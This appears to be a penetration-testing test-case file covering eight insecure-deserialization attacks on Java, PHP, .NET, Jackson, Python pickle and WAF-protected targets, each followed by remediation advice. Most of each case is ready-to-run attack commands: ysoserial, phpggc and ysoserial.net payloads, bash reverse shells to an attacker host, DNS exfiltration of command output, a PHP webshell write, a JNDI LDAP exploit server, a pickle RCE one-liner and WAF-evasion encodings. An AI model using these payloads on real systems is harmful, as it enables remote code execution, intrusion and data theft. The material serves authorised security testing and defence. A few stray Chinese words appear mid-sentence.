# Web Deserialization Test Cases

> This file is a companion to `SKILL.md`, containing structured test cases organized by deserialization attack category and severity.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-------------|
| A. Java Deserialization | 1 | CRITICAL |
| B. PHP Deserialization | 1 | CRITICAL |
| C. .NET Deserialization | 1 | CRITICAL |
| D. Blind Deserialization Detection | 1 | HIGH |
| E. Jackson/JSON Deserialization | 1 | CRITICAL |
| F. Python Pickle Deserialization | 1 | CRITICAL |
| G. WAF Bypass Techniques | 1 | HIGH |
| H. Gadget Chain Analysis | 1 | HIGH |
| **Total** | **8** | **HIGH - CRITICAL** |

---

## A. Java Deserialization

### TC-DESER-001: Java ysoserial CommonsCollections RCE Exploitation

| Field | Value |
|------|-----|
| **ID** | TC-DESER-001 |
| **Name** | Java ysoserial CommonsCollections Remote Code Execution |
| **Category** | A. Java Deserialization |
| **Severity** | CRITICAL |
| **Objective** | Exploit Java deserialization vulnerability using ysoserial CommonsCollections gadget chains to achieve remote code execution on the target server |
| **Prerequisites** | Target application accepts Java serialized objects (identified by `0xACED0005` magic bytes or Base64-encoded data starting with `rO0AB`); Apache Commons Collections library present in classpath (versions 3.1-4.0); ability to inject serialized data via HTTP parameter, cookie, or API body |
| **Test Steps** | 1. Identify deserialization input vector by searching for Base64 strings starting with `rO0AB` in cookies, POST body, or headers<br>2. Decode existing serialized data and inspect class names using `java -jar ysoserial.jar CommonsCollections5 'id' \| base64 -w0`<br>3. Use GadgetProbe to enumerate available classes: `java -cp gadgetprobe.jar GadgetProbe --dns-callback callback.attacker.com --input suspect_data.bin`<br>4. Confirm Commons Collections version from server response headers or error messages<br>5. Generate payload with DNS callback: `java -jar ysoserial.jar CommonsCollections6 'nslookup $(whoami).attacker.com' \| base64 -w0`<br>6. Replace original serialized data with malicious payload in the identified input vector<br>7. Send request and monitor DNS callback server for confirmation<br>8. Generate RCE payload: `java -jar ysoserial.jar CommonsCollections5 'bash -i >& /dev/tcp/attacker/4444 0>&1' \| base64 -w0`<br>9. If CommonsCollections5 fails, test alternative chains: CommonsCollections1, CommonsCollections6, CommonsCollections7 |
| **Expected Result** | DNS callback received confirming deserialization execution; command output exfiltrated via callback channel; reverse shell established confirming full RCE capability |
| **Pass Criteria** | 1. DNS or HTTP callback received within 30 seconds of payload delivery<br>2. Callback contains unique identifier proving command execution on target<br>3. At least one CommonsCollections chain successfully executes commands<br>4. Error messages do not reveal payload content to end users |
| **Remediation** | Implement ObjectInputStream whitelist via `resolveClass()` override; upgrade Apache Commons Collections to 3.2.2+ with `InvokerTransformer` disabled; replace native Java serialization with JSON or Protocol Buffers; deploy Java agent-based RASP to monitor `readObject()` calls; sign all serialized data with HMAC |

---

## B. PHP Deserialization

### TC-DESER-002: PHP phpggc Laravel Gadget Chain Exploitation

| Field | Value |
|------|-----|
| **ID** | TC-DESER-002 |
| **Name** | PHP phpggc Laravel Object Injection RCE |
| **Category** | B. PHP Deserialization |
| **Severity** | CRITICAL |
| **Objective** | Exploit PHP deserialization vulnerability in a Laravel application using phpggc gadget chains to achieve remote code execution |
| **Prerequisites** | Target PHP application uses Laravel framework (any version); user-controlled input reaches `unserialize()` function (identified via code review or by injecting `O:8:"stdClass"` and observing errors); Laravel dependencies (Monolog, Guzzle, etc.) available as gadget chain components |
| **Test Steps** | 1. Identify PHP deserialization entry point by looking for `unserialize()` calls in source code or injecting `O:1:"X":0:{}` and checking for PHP error responses<br>2. Determine Laravel version from response headers (`X-Powered-By`), `composer.json` disclosure, or default error pages<br>3. List available phpggc chains: `phpggc -l \| grep -i laravel`<br>4. Generate test payload with DNS/HTTP callback: `phpggc -b Laravel/RCE1 'file_get_contents("http://attacker/callback")'`<br>5. Inject serialized payload into identified parameter (URL, cookie, or POST field)<br>6. Monitor callback server for HTTP request confirming execution<br>7. Escalate to RCE: `phpggc -b Laravel/RCE1 'system("bash -i >& /dev/tcp/attacker/4444 0>&1")'`<br>8. If direct RCE fails, attempt file write chain: `phpggc Laravel/RCE1 'file_put_contents("/var/www/html/s.php","<?php system(\$_GET[0]); ?>")'`<br>9. Test alternative chains: Laravel/RCE2, Laravel/RCE3, Laravel/RCE4, Laravel/RCE5 |
| **Expected Result** | HTTP callback received confirming PHP code execution; webshell written to accessible directory; reverse shell connection established from target server |
| **Pass Criteria** | 1. Callback server receives HTTP request from target IP within 30 seconds<br>2. At least one Laravel chain produces reliable code execution<br>3. File write chain successfully creates webshell in web-accessible directory<br>4. PHP error messages do not disclose full stack trace in production |
| **Remediation** | Remove all `unserialize()` calls handling user input; replace with `json_decode()` for data interchange; implement `unserialize()` allowed_classes whitelist: `unserialize($data, ['allowed_classes' => false])`; upgrade Laravel and all dependencies to latest versions; implement input validation rejecting serialized object strings (pattern: `/^[Oo]:\d+:/`) |

---

## C. .NET Deserialization

### TC-DESER-003: .NET ysoserial.net ViewState Remote Code Execution

| Field | Value |
|------|-----|
| **ID** | TC-DESER-003 |
| **Name** | ASP.NET ViewState Deserialization RCE via ysoserial.net |
| **Category** | C. .NET Deserialization |
| **Severity** | CRITICAL |
| **Objective** | Exploit ASP.NET ViewState deserialization by leveraging known or disclosed machineKey values to achieve remote code execution via ysoserial.net |
| **Prerequisites** | Target ASP.NET application uses ViewState (identified by `__VIEWSTATE` hidden field); machineKey values obtained through configuration file disclosure, known CVE, or default keys; ViewState MAC validation can be bypassed or is disabled |
| **Test Steps** | 1. Identify ASP.NET application by checking response headers for `X-AspNet-Version` or `X-Powered-By: ASP.NET`<br>2. Extract `__VIEWSTATE` and `__VIEWSTATEGENERATOR` values from page HTML<br>3. Attempt to decode existing ViewState: `cat viewstate.txt \| base64 -d \| xxd \| head -20`<br>4. If machineKey is known, generate payload: `ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c whoami" --base64 --machinekey "VALID_KEY,DECRYPT_KEY" --path="/default.aspx"`<br>5. If ViewState MAC is disabled: `ysoserial.net -g TypeConfuseDelegate -f LosFormatter -c "cmd /c echo pwned > C:\pwned.txt" --base64`<br>6. Replace `__VIEWSTATE` value with generated payload in HTTP request<br>7. Send forged request and check for command execution (DNS callback: `cmd /c nslookup attacker.com`)<br>8. Escalate to reverse shell using PowerShell encoded command |
| **Expected Result** | ViewState accepted by server without MAC validation error; command executed on target server; DNS/HTTP callback received confirming RCE |
| **Pass Criteria** | 1. Server processes forged ViewState without returning 500 error<br>2. Command execution confirmed via OOB callback within 30 seconds<br>3. ViewState MAC bypass successful with known machineKey<br>4. Application does not enforce ViewState encryption on all pages |
| **Defense** | Set `enableViewStateMac="true"` and `AspNetEnforceViewStateMac="true"` in web.config; rotate machineKey values regularly; migrate to ASP.NET Core which uses Data Protection API instead of ViewState; set `ViewStateEncryptionMode="Always"` for sensitive pages; monitor for异常 ViewState sizes in request logs |

---

## D. Blind Deserialization Detection

### TC-DESER-004: Blind Deserialization Detection via OOB Channels

| Field | Value |
|------|-----|
| **ID** | TC-DESER-004 |
| **Name** | Blind Insecure Deserialization Detection Using Time-Based and OOB Techniques |
| **Category** | D. Blind Deserialization Detection |
| **Severity** | HIGH |
| **Objective** | Detect and confirm blind deserialization vulnerabilities where the application does not reflect deserialization errors or output in HTTP responses |
| **Pre-condition** | Target application accepts serialized data but does not display error messages or output; attacker has control over DNS resolution or can observe timing differences; identified input vector for serialized data (cookie, header, POST parameter) |
| **Test Steps** | 1. Identify potential deserialization input vectors by inspecting all HTTP parameters for Base64-encoded data or binary blobs<br>2. Send a malformed serialized object and compare response to baseline (status code, timing, length)<br>3. Generate time-delay payload: `java -jar ysoserial.jar CommonsCollections5 'sleep 5' \| base64 -w0`<br>4. Send time-delay payload and measure response time: `time curl -s -o /dev/null -w '%{time_total}' -H 'Cookie: session=PAYLOAD' http://target/app`<br>5. Generate DNS callback payload: `java -jar ysoserial.jar CommonsCollections5 'nslookup attacker.burpcollaborator.net' \| base64 -w0`<br>6. Send DNS callback payload and monitor DNS server for incoming queries<br>7. Use GadgetProbe for classpath enumeration: `java -cp gadgetprobe.jar GadgetProbe --dns-callback attacker.burpcollaborator.net --input suspect_data`<br>8. For PHP targets, use: `phpggc -b Laravel/RCE1 'file_get_contents("http://attacker/blind-php")'`<br>9. For .NET targets, use: `ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c nslookup attacker.com" --base64` |
| **Expected Outcome** | Measurable response time difference of 5+ seconds for time-based payload; DNS query received on callback server from target IP; HTTP callback received confirming code execution; GadgetProbe identifies available classes for chain selection |
| **Verification** | 1. Time-based: response time for sleep payload is consistently 5+ seconds longer than baseline<br>2. DNS-based: callback server logs DNS query from target IP within 60 seconds<br>3. HTTP-based: callback server logs HTTP request with unique identifier<br>4. GadgetProbe: at least one exploitable class identified in target classpath |
| **Mitigation** | Implement strict deserialization monitoring and logging; deploy RASP agents to detect `ObjectInputStream.readObject()` and `unserialize()` calls; block outbound DNS/HTTP from application servers to internet; standardize error response times to prevent time-based inference; use integrity verification (HMAC signatures) on all serialized data |

---

## E. Jackson/JSON Deserialization

### TC-DESER-005: Jackson Polymorphic Deserialization JNDI Injection

| Field | Value |
|------|-----|
| **ID** | TC-DESER-005 |
| **Name** | Jackson Polymorphic Deserialization Exploitation via JNDI Injection |
| **Category** | E. Jackson/JSON Deserialization |
| **Severity** | CRITICAL |
| **Objective** | Exploit Jackson deserialization with DEFAULT_TYPING enabled to achieve RCE through JNDI injection using com.sun.rowset.JdbcRowSetImpl |
| **Prerequisites** | Target application uses Jackson for JSON deserialization; `DEFAULT_TYPING` is enabled ( ObjectMapper.enableDefaultTyping() ); application accepts JSON input with `@class` type annotations; JNDI/LDAP outbound connections are not blocked by firewall |
| **Test Steps** | 1. Identify Jackson usage by sending malformed JSON and checking error messages for "com.fasterxml.jackson" references<br>2. Test for DEFAULT_TYPING by sending: `["java.net.URL","http://attacker/jackson-probe"]` and monitoring for HTTP callback<br>3. Set up LDAP reference server: `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker:8000 1389`<br>4. Create and serve malicious Exploit.class with static initializer executing commands<br>5. Craft JdbcRowSetImpl payload: `["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}]`<br>6. Send JSON payload to identified API endpoint<br>7. Monitor LDAP server for incoming connection and HTTP server for class file request<br>8. If JNDI is blocked, try Fastjson autotype bypass for Chinese application stacks<br>9. For XStream targets, craft XML-based payload: `<java.util.ProcessBuilder><command><string>cmd</string><string>/c</string><string>whoami</string></command></java.util.ProcessBuilder>` |
| **Expected Result** | LDAP server receives connection from target; malicious class loaded and static initializer executed; command execution confirmed via callback channel |
| **Checklist** | 1. Jackson DEFAULT_TYPING confirmed active via URL probe<br>2. LDAP reference server receives connection from target IP<br>3. HTTP server serves Exploit.class and receives GET request<br>4. Command execution confirmed via OOB callback<br>5. Alternative Fastjson/XStream vectors tested if Jackson fails |
| **Remediation** | Disable `DEFAULT_TYPING` in Jackson configuration; use `@JsonTypeInfo(use=Id.NAME)` with explicit type whitelist; upgrade Jackson to 2.10+ which restricts polymorphic deserialization by default; implement a custom TypeResolverBuilder that validates class names against whitelist; block outbound LDAP/RMI connections from application servers |

---

## F. Python Pickle Deserialization

### TC-DESER-006: Python Pickle Deserialization RCE via Flask/Django Session

| Field | Value |
|------|-----|
| **ID** | TC-DESER-006 |
| **Name** | Python Pickle Deserialization RCE in Flask/Django Session Handling |
| **Category** | F. Python Pickle Deserialization |
| **Severity** | CRITICAL |
| **Objective** | Exploit Python pickle deserialization vulnerability in Flask or Django session handling to achieve remote code execution |
| **Pre-condition** | Target application is Python-based (Flask or Django); application uses pickle-based session serialization (Flask < 1.0 with PickleSerializer, Django with signed_cookies and PickleSerializer); SECRET_KEY is known through information disclosure, source code leak, or brute force |
| **Test Steps** | 1. Identify Python web framework from response headers (`Server: Werkzeug`, `X-Frame-Options` patterns)<br>2. Examine session cookie format -- Flask uses `.`-separated Base64, Django uses `:`-separated signed data<br>3. For Flask: attempt to decode session with `flask-unsign --unsign --cookie 'SESSION_VALUE' --wordlist wordlist.txt`<br>4. For Django: attempt to decode session with known SECRET_KEY using Django shell<br>5. Generate pickle RCE payload: `python3 -c "import pickle,base64,os;class E:__reduce__=lambda s:(os.system,('id',));print(base64.b64encode(pickle.dumps(E())).decode())"`<br>6. For Flask, sign the malicious payload: `flask-unsign --sign --cookie 'PICKLE_PAYLOAD' --secret 'SECRET_KEY'`<br>7. Replace session cookie with forged value and send request<br>8. Generate reverse shell payload: `python3 -c "import pickle,base64,os;class S:__reduce__=lambda s:(os.system,('bash -i >& /dev/tcp/attacker/4444 0>&1',));print(base64.b64encode(pickle.dumps(S())).decode())"`<br>9. If YAML deserialization is present, test: `!!python/object/apply:os.system ['id']` |
| **Expected Outcome** | Pickle payload executed on server; command output exfiltrated; reverse shell established from target; session cookie forged successfully with known SECRET_KEY |
| **Verification** | 1. Flask-unsign successfully cracks or verifies SECRET_KEY<br>2. Forged session cookie accepted by server (no 500 error or session reset)<br>3. OOB callback received confirming pickle payload execution<br>4. Reverse shell connection established on listener port |
| **Defense** | Migrate Flask session serialization to JSON-based itsdangerous (Flask >= 1.0 default); set Django SESSION_SERIALIZER to `django.contrib.sessions.serializers.JSONSerializer`; never use `pickle.loads()` on untrusted data; implement `RestrictedUnpickler` class overriding `find_class()` with whitelist; rotate SECRET_KEY after any suspected compromise; use environment variables for SECRET_KEY, never hardcode in source |

---

## G. WAF Bypass Techniques

### TC-DESER-007: Deserialization WAF Bypass via Encoding and Chain Substitution

| Field | Value |
|------|-----|
| **ID** | TC-DESER-007 |
| **Name** | Deserialization Detection Bypass Using Encoding, Compression, and Alternative Gadget Chains |
| **Category** | G. WAF Bypass Techniques |
| **Severity** | HIGH |
| **Objective** | Bypass Web Application Firewall deserialization detection rules using payload encoding, compression, and alternative gadget chains that avoid known signatures |
| **Prerequisites** | Deserialization vulnerability confirmed via blind detection (TC-DESER-004); WAF or IDS blocking standard ysoserial/phpggc payloads; attacker has multiple encoding options (Base64, gzip, URL-encoding, hex) |
| **Test Steps** | 1. Confirm WAF is blocking payloads by sending standard ysoserial output and observing 403/block responses<br>2. Test gzip compression bypass: `java -jar ysoserial.jar CommonsCollections5 'id' \| gzip \| base64 -w0`<br>3. Test alternative chains avoiding "CommonsCollections" signature: `java -jar ysoserial.jar Spring1 'id' \| base64 -w0`, `java -jar ysoserial.jar Groovy1 'id' \| base64 -w0`<br>4. Test double URL-encoding: encode the Base64 payload twice for servers that decode recursively<br>5. Test chunked transfer encoding to split payload across multiple HTTP chunks<br>6. For PHP: test phar wrapper: `phpggc -p phar Laravel/RCE1 'system("id")' -o evil.phar` then upload as image<br>7. Test protocol-level bypass using JRMP/JNDI indirection: `java -jar ysoserial.jar JRMPClient 'attacker:1099' \| base64 -w0` (payload contains no dangerous classes, just a URL)<br>8. Monitor each attempt for successful callback while WAF does not trigger |
| **Expected Result** | At least one bypass technique successfully delivers exploit payload past WAF; command execution confirmed via OOB callback; WAF logs show no alerts for bypassed payloads |
| **Pass Criteria** | 1. WAF returns 200 (not 403/406) for at least one bypass technique<br>2. OOB callback received confirming payload execution despite WAF presence<br>3. At least 2 different bypass methods documented and verified<br>4. WAF alert logs contain no entries matching bypassed payloads |
| **Mitigation** | Deploy RASP (Runtime Application Self-Protection) for in-process deserialization monitoring; inspect decompressed and decoded payloads at the application layer; implement strict Content-Type validation; use signed serialization formats that WAF can verify; monitor for异常 outbound connections from application servers regardless of inbound payload encoding |

---

## H. Gadget Chain Analysis

### TC-DESER-008: Gadget Chain Identification and Exploitation Planning

| Field | Value |
|------|-----|
| **ID** | TC-DESER-008 |
| **Name** | Gadget Chain Analysis and Custom Payload Development |
| **Category** | H. Gadget Chain Analysis |
| **Severity** | HIGH |
| **Objective** | Systematically enumerate available classes on target classpath, identify viable gadget chains, and develop custom exploitation payloads for non-standard library combinations |
| **Prerequisites** | Deserialization vulnerability confirmed (blind or visible); target application accepts serialized data; GadgetProbe and marshalsec tools available; access to decompiler (cfr, procyon, or jadx) |
| **Test Steps** | 1. Extract existing serialized data from target for GadgetProbe input<br>2. Run GadgetProbe DNS enumeration with comprehensive wordlist: `java -cp gadgetprobe.jar GadgetProbe --dns-callback callback.attacker.com --wordlist java-classes.txt --input base64_data`<br>3. Analyze GadgetProbe results to identify available libraries and versions<br>4. Decompile target application JAR/WAR to identify custom classes: `jar tf app.jar \| grep -i transformer`<br>5. Cross-reference available classes with ysoserial chain requirements<br>6. Test standard chains systematically against target<br>7. If standard chains fail, use marshalsec to generate alternative format payloads: `java -cp marshalsec.jar marshalsec.Hessian 'curl http://attacker/test'`<br>8. Document chain compatibility: which chains work, which fail, and error patterns<br>9. Build custom gadget chain by chaining available sink classes (Runtime.exec, ProcessBuilder, ScriptEngine) with source classes (HashMap, PriorityQueue, EventHandler) |
| **Expected Result** | Complete classpath map of available exploitable classes; at least one viable gadget chain identified; custom payload generated and verified for target-specific library combination |
| **Verification** | 1. GadgetProbe identifies 3+ exploitable classes in target classpath<br>2. At least one standard ysoserial/phpggc chain successfully tested<br>3. Custom chain documented with source class, sink class, and intermediate gadgets<br>4. Payload reliability verified across 3+ repeated attempts |
| **Remediation** | Remove unnecessary libraries from classpath to reduce gadget chain surface; upgrade all libraries to patched versions that break known chains; implement `ObjectInputFilter` (Java 9+) with strict class whitelist; deploy Java Security Manager with minimal permissions; use serialization proxy pattern for sensitive classes; conduct regular dependency auditing with OWASP Dependency-Check |
